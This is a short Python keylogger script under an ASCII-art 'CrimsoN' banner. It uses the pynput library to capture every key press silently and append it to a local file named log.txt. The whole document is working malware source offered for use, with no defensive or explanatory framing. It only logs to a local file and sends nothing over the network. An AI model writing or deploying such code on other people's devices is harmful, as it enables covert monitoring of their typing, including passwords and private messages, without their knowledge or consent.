#   _____      _                     _   _ 
#  / ____|    (_)                   | \ | |
# | |     _ __ _ _ __ ___  ___  ___ |  \| |
# | |    | '__| | '_ ` _ \/ __|/ _ \| . ` |
# | |____| |  | | | | | | \__ \ (_) | |\  |
#  \_____|_|  |_|_| |_| |_|___/\___/|_| \_|
                                                                           
#keylogger 

from pynput.keyboard import Listener#this import allows Python to access keystrokes

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("`","")#Makes it easier to read in the text file
    with open("log.txt","a") as file:#opens the file to write the keystrokes inputted
        file.write("\n"+keydata)
###########################################
with Listener(on_press=writetofile) as l:
    l.join()
